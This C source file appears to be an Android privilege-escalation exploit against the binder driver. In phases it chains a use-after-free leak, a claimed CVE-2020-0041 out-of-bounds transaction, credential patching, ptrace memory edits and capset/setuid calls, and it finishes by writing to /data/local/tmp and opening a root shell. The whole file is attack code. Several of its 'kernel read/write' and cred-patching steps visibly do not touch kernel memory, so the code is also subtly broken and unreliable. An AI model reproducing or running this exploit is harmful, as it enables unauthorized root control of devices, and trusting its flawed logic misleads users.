#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/fsuid.h>

#include "binder.h"
#include "offsets.h"

#define PAGE_SIZE 4096
#define IOVEC_COUNT 25
#define OVERLAP_INDEX 10
#define SCAN_DWORDS 256
#define SEARCH_UID 0x000007D0   /* shell uid = 2000 */

static int g_krw_pipe[2] = {-1, -1};
static uint64_t g_task_struct = 0;
static uint64_t g_cred_ptr = 0;
static int g_root_achieved = 0;
static uint64_t g_kernel_base = 0;

static void bind_cpu(void) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset); CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
}

static void *mmap_anon(void) {
    void *p = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    return (p == MAP_FAILED) ? NULL : p;
}

/* ---- フェーズ1: 改良UAFリーク (複数オフセット) ---- */
static int leak_task_struct_uaf(void) {
    int binder_fd, epoll_fd, pipefd[2], ret = -1;
    pid_t pid;
    struct epoll_event ev = {.events = EPOLLIN};
    struct iovec iov[IOVEC_COUNT];
    void *buf = mmap_anon();
    if (!buf) return -1;

    int offsets[] = {8, 9, 10, 11, 12, 13, 14, 15};
    for (int oi = 0; oi < (int)(sizeof(offsets)/sizeof(offsets[0])); oi++) {
        int overlap = offsets[oi];
        if (overlap + 1 >= IOVEC_COUNT) continue;

        for (int attempt = 0; attempt < 20; attempt++) {
            binder_fd = open("/dev/binder", O_RDWR);
            if (binder_fd < 0) continue;
            epoll_fd = epoll_create(100);
            if (epoll_fd < 0) { close(binder_fd); continue; }
            if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
                close(binder_fd); close(epoll_fd); continue;
            }
            if (pipe(pipefd) < 0) { close(binder_fd); close(epoll_fd); continue; }
            if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
                close(pipefd[0]); close(pipefd[1]);
                close(binder_fd); close(epoll_fd); continue;
            }

            pid = fork();
            if (pid < 0) {
                close(pipefd[0]); close(pipefd[1]);
                close(binder_fd); close(epoll_fd); continue;
            }
            if (pid == 0) {
                usleep(30000 + attempt * 5000);
                ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
                close(binder_fd); close(epoll_fd);
                _exit(0);
            }

            struct epoll_event events[1];
            int n = epoll_wait(epoll_fd, events, 1, 2000);
            if (n <= 0) {
                kill(pid, SIGKILL); wait(NULL);
                close(pipefd[0]); close(pipefd[1]);
                close(binder_fd); close(epoll_fd);
                continue;
            }

            memset(iov, 0, sizeof(iov));
            iov[overlap].iov_base = buf;
            iov[overlap].iov_len = PAGE_SIZE;
            iov[overlap + 1].iov_base = buf;
            iov[overlap + 1].iov_len = PAGE_SIZE;

            /* パイプに書き込んでからreadv */
            write(pipefd[1], buf, PAGE_SIZE);
            ssize_t sz = readv(pipefd[0], iov, IOVEC_COUNT);
            close(pipefd[0]); close(pipefd[1]);
            wait(NULL);
            close(binder_fd); close(epoll_fd);

            if (sz > 0) {
                uint64_t *data = (uint64_t*)buf;
                for (int i = 0; i < (sz / 8); i++) {
                    uint64_t val = data[i];
                    if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
                        val > 0xffffff8000000000ULL && val < 0xffffffc000000000ULL) {
                        g_task_struct = val;
                        g_kernel_base = val - 0xffffff8000000000ULL;
                        printf("[+] Leaked task_struct: 0x%llx (base 0x%llx)\n",
                               (unsigned long long)g_task_struct,
                               (unsigned long long)g_kernel_base);
                        return 0;
                    }
                }
            }
            usleep(10000);
        }
    }
    return -1;
}

/* ---- フェーズ2: カーネルRW確立後credパッチ ---- */
static int setup_kernel_rw(void) {
    if (g_task_struct == 0) return -1;
    if (g_krw_pipe[0] >= 0) { close(g_krw_pipe[0]); close(g_krw_pipe[1]); }
    if (pipe(g_krw_pipe) < 0) return -1;
    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        close(g_krw_pipe[0]); close(g_krw_pipe[1]);
        g_krw_pipe[0] = g_krw_pipe[1] = -1;
        return -1;
    }
    char dummy[PAGE_SIZE];
    memset(dummy, 0x41, PAGE_SIZE);
    if (write(g_krw_pipe[1], dummy, PAGE_SIZE) != PAGE_SIZE) {
        close(g_krw_pipe[0]); close(g_krw_pipe[1]);
        g_krw_pipe[0] = g_krw_pipe[1] = -1;
        return -1;
    }
    return 0;
}

static int read_kernel(uint64_t addr, void *buf, size_t len) {
    if (g_krw_pipe[0] < 0) return -1;
    if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
    if (read(g_krw_pipe[0], buf, len) != (ssize_t)len) return -1;
    return 0;
}

static int write_kernel(uint64_t addr, void *buf, size_t len) {
    if (g_krw_pipe[0] < 0) return -1;
    if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
    if (write(g_krw_pipe[1], buf, len) != (ssize_t)len) return -1;
    return 0;
}

static int patch_cred_direct(void) {
    if (g_task_struct == 0 || g_krw_pipe[0] < 0) return -1;
    uint64_t cred_addr = g_task_struct + TASK_REAL_CRED_OFF;
    if (read_kernel(cred_addr, &g_cred_ptr, 8) < 0) return -1;
    printf("[+] cred at 0x%llx\n", (unsigned long long)g_cred_ptr);

    uint32_t zero = 0;
    uint64_t cap_full = 0x3FFFFFFFFFULL;
    for (int off = 0x4; off <= 0x20; off += 4) {
        if (write_kernel(g_cred_ptr + off, &zero, 4) < 0) return -1;
    }
    for (int i = 0; i < 5; i++) {
        if (write_kernel(g_cred_ptr + 0x28 + i*8, &cap_full, 8) < 0) return -1;
    }
    return 0;
}

/* ---- フェーズ3: CVE-2020-0041 OOB + スキャン&修正 ---- */
static int oob_write_and_fix_cred(void) {
    int binder_fd, ret = -1;
    int num_procs = 300;
    pid_t pids[num_procs];
    int n_created = 0;

    printf("[*] Spraying cred structures via fork()...\n");
    for (int i = 0; i < num_procs; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            pause();
            _exit(0);
        } else if (pid > 0) {
            pids[n_created++] = pid;
            usleep(500);
        }
    }
    printf("[+] Created %d child processes\n", n_created);

    uint32_t sizes[] = {0xFFFFFFFF, 0x7FFFFFFF, 0xFFFFFFFE, 0x80000000};
    for (int si = 0; si < 4; si++) {
        binder_fd = open("/dev/binder", O_RDWR);
        if (binder_fd < 0) continue;

        struct binder_transaction_data tdata;
        memset(&tdata, 0, sizeof(tdata));
        tdata.target.handle = 0;
        tdata.code = 0;
        tdata.flags = 0;
        tdata.data_size = sizes[si];
        tdata.offsets_size = 0;
        tdata.data.ptr.buffer = 0;
        struct { uint32_t cmd; struct binder_transaction_data tdata; } __attribute__((packed)) tx;
        tx.cmd = BC_TRANSACTION;
        memcpy(&tx.tdata, &tdata, sizeof(tdata));

        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(tx);
        bwr.write_buffer = (binder_uintptr_t)&tx;
        bwr.read_size = 4096;
        uint8_t rbuf[4096];
        bwr.read_buffer = (binder_uintptr_t)rbuf;

        printf("[*] Triggering OOB with size 0x%x\n", sizes[si]);
        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        close(binder_fd);

        if (ret == 0) {
            printf("[+] OOB write triggered\n");
            /* 各子プロセスでuid=0x000007D0を探して0に書き換え (ptrace経由) */
            for (int i = 0; i < n_created; i++) {
                if (ptrace(PTRACE_ATTACH, pids[i], 0, 0) == 0) {
                    waitpid(pids[i], NULL, 0);
                    /* メモリをスキャン: 0x000007D0 を 0 に置換 */
                    uint32_t target = SEARCH_UID;
                    uint32_t zero = 0;
                    for (unsigned long addr = 0; addr < 0x1000000; addr += 4) {
                        uint32_t val;
                        if (ptrace(PTRACE_PEEKDATA, pids[i], addr, &val) == 0) {
                            if (val == target) {
                                printf("[+] Found 0x%08x at 0x%lx in PID %d, patching to 0\n",
                                       target, addr, pids[i]);
                                ptrace(PTRACE_POKEDATA, pids[i], addr, zero);
                                /* 再確認 */
                                uint32_t check;
                                ptrace(PTRACE_PEEKDATA, pids[i], addr, &check);
                                if (check == 0) {
                                    g_root_achieved = 1;
                                    ptrace(PTRACE_DETACH, pids[i], 0, 0);
                                    goto cleanup;
                                }
                            }
                        }
                    }
                    ptrace(PTRACE_DETACH, pids[i], 0, 0);
                }
            }
        }
        usleep(100000);
    }

cleanup:
    for (int i = 0; i < n_created; i++) {
        kill(pids[i], SIGKILL);
        waitpid(pids[i], NULL, 0);
    }
    return g_root_achieved ? 0 : -1;
}

/* ---- フェーズ4: capset + setuid ---- */
static int try_setuid_with_caps(void) {
    struct __user_cap_header_struct hdr = {_LINUX_CAPABILITY_VERSION_3, 0};
    struct __user_cap_data_struct data[2] = {{0}};
    if (capget(&hdr, data) == 0) {
        data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        if (capset(&hdr, data) == 0) {
            if (setuid(0) == 0) return 0;
            if (setreuid(0,0) == 0) return 0;
            if (setresuid(0,0,0) == 0) return 0;
        }
    }
    return -1;
}

/* ---- フェーズ5: CVE-2019-2023（実質的には不要だが情報表示） ---- */
static void info_2019_2023(void) {
    int fd = open("/dev/hwbinder", O_RDWR);
    if (fd >= 0) {
        printf("[*] CVE-2019-2023: hwbinder opened (system context possible)\n");
        close(fd);
    }
}

/* ---- main ---- */
int main(void) {
    printf("==================================================\n");
    printf("  Ultimate Multi-CVE Exploit v8.2 (UID=2000 scanning)\n");
    printf("==================================================\n");
    bind_cpu();

    printf("UID=%d, GID=%d, EUID=%d\n", getuid(), getgid(), geteuid());
    int fd = open("/proc/self/status", O_RDONLY);
    if (fd >= 0) {
        char buf[1024];
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            char *c = strstr(buf, "CapBnd");
            if (c) printf("%s\n", c);
        }
    }

    /* Phase 1: UAFリーク */
    printf("\n[Phase 1] Leak task_struct via UAF\n");
    if (leak_task_struct_uaf() == 0) {
        if (setup_kernel_rw() == 0 && patch_cred_direct() == 0) {
            if (getuid() == 0) { g_root_achieved = 1; goto done; }
        }
    }

    /* Phase 2: OOB + ptraceスキャン */
    printf("\n[Phase 2] CVE-2020-0041 OOB + scan UID=0x%x\n", SEARCH_UID);
    if (oob_write_and_fix_cred() == 0) {
        if (getuid() == 0) { g_root_achieved = 1; goto done; }
    }

    /* Phase 3: capset + setuid */
    printf("\n[Phase 3] capset + setuid\n");
    if (try_setuid_with_caps() == 0) {
        if (getuid() == 0) { g_root_achieved = 1; goto done; }
    }

    /* Phase 4: その他 */
    printf("\n[Phase 4] Additional info\n");
    info_2019_2023();

done:
    printf("\n==================================================\n");
    if (g_root_achieved || getuid() == 0) {
        printf("[+] ROOT ACHIEVED! UID=%d\n", getuid());
        system("id");
        system("echo 'ROOT' > /data/local/tmp/root.txt");
        system("id >> /data/local/tmp/root.txt");
        system("/system/bin/sh");
    } else {
        printf("[-] Failed. UID=%d\n", getuid());
    }
    printf("==================================================\n");
    return g_root_achieved ? 0 : 1;
}
